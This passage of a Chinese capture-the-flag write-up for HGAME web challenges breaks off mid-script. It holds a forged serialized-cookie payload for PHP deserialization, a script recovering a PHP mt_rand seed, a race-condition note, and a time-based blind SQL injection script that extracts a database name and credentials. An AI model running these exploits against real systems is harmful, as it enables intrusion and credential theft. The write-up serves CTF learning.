+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 确保程序是跑在服务器上的！</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;serverKey = $_SERVER[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;key === <span class="keyword">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'rank'</span>] = <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 非正常访问</span></span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在monster类发现了<code>unserialize</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $monsterData;</span><br><span class="line"><span class="keyword">private</span> $encryptKey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;encryptKey = $key;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'monster'</span>]))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $monsterData = base64_decode($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">        $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">        $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们只要根据以下代码构造monster值即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">Save</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sign = md5(serialize(<span class="keyword">$this</span>-&gt;monsterData) . <span class="keyword">$this</span>-&gt;encryptKey);</span><br><span class="line">  	setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="keyword">$this</span>-&gt;monsterData) . $sign));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $rank=<span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rank = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    $new = <span class="keyword">new</span> Rank();</span><br><span class="line">    $encryptKey = <span class="string">"aff6ecd6e060051b65fc173e573d89e4b3b6e30320e27165a7c1b8af30cc4f94"</span>;</span><br><span class="line">    $sign = md5(serialize($new) . $encryptKey);</span><br><span class="line">    $payload = base64_encode(serialize($new) . $sign);</span><br><span class="line">    <span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/hgame/web/3_1/2.jpg" alt="2"></p>
+<h4 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h4><p>爆破种子，搜索可知通过两个随机数可以出一个种子，参考以下文章</p>
+<p><a href="https://www.anquanke.com/post/id/196831" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196831</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="string">"""Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    state = [<span class="literal">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i - <span class="number">1</span>]</span><br><span class="line">        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; <span class="number">30</span>)) + i) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span><span class="params">(s, p)</span>:</span></span><br><span class="line">    <span class="string">"""From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span><span class="params">(s, i)</span>:</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line"></span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line"></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span><span class="params">(v, shift, mask)</span>:</span></span><br><span class="line">    <span class="string">"""r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(v, start, size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(state, flavour)</span>:</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i + M], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i + M - N], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span><span class="params">(m, u, v, flavour)</span>:</span></span><br><span class="line">    <span class="string">"""Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span><span class="params">(S000, S227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227's LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We're missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(_R000, _R227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_do_undo</span><span class="params">(do, undo)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        rand = random.randrange(<span class="number">1</span>, MAX)</span><br><span class="line">        done = do(rand)</span><br><span class="line">        undone = undo(done)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rand == undone:</span><br><span class="line">            print(<span class="string">f"-- <span class="subst">&#123;i&#125;</span> ----"</span>)</span><br><span class="line">            print(bin(rand).rjust(<span class="number">34</span>))</span><br><span class="line">            print(bin(undone).rjust(<span class="number">34</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    test_do_undo(</span><br><span class="line">        php_mt_initialize,</span><br><span class="line">        <span class="keyword">lambda</span> s: undo_php_mt_initialize(s[<span class="number">227</span>], <span class="number">227</span>)</span><br><span class="line">    )</span><br><span class="line">    test_do_undo(</span><br><span class="line">        php_mt_rand,</span><br><span class="line">        undo_php_mt_rand</span><br><span class="line">    )</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://twoshot.hgame.n3ko.co/'</span></span><br><span class="line">req = requests.session()</span><br><span class="line">res = req.get(url+<span class="string">"random.php?times=228"</span>)</span><br><span class="line">arr = json.loads(res.content)</span><br><span class="line"><span class="comment"># print arr</span></span><br><span class="line"><span class="comment">#main函数中的参数值分别为 某个随机数值 与此相隔226个随机数的随机数值 第一个参数中的随机数前面的随机数个数 php5为0，php7为1</span></span><br><span class="line">seed = main(arr[<span class="number">0</span>],arr[<span class="number">227</span>],<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">r = req.post(url+<span class="string">"verify.php"</span>, data=&#123;<span class="string">"ans"</span>:seed&#125;)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h4><p>条件竞争，使用burpsuite低线程买入，高线程卖出即可轻轻松松获得一个亿</p>
+<p><img src="../../../../img/hgame/web/3_3/1.jpg" alt="1"></p>
+<h4 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h4><p>delete_id处存在时间盲注，sleep有时候能用，有时候又不能用，干脆直接都改成benchmark了，name字段爆破了一下长度，发现104位，我人晕了，爆了前10位发现第一个值就是我们要的，于是name和password就都只爆第一个值了，爆出用户名和密码就可以直接登录拿flag了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=%s%%23"</span></span><br><span class="line">cookie = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"actlgha6oln1pc6hkb4jdm05k1"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># database_len</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">"if(length(database())%%3d%s,benchmark(30000000,sha(1)),1)"</span> % str(i)</span><br><span class="line">    req_url = url % (payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    res = requests.get(req_url,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"database_len: "</span> + str(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># babysql</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(substr(database(),%s,1))%%3d%s,benchmark(30000000,sha(1)),1)"</span> % (str(i),str(j))</span><br><span class="line">        req_url = url % (payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.get(req_url, cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt;= <span class="number">4</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"database_name: "</span> + database</span><br><span class="line"></span><br><span class="line"><span 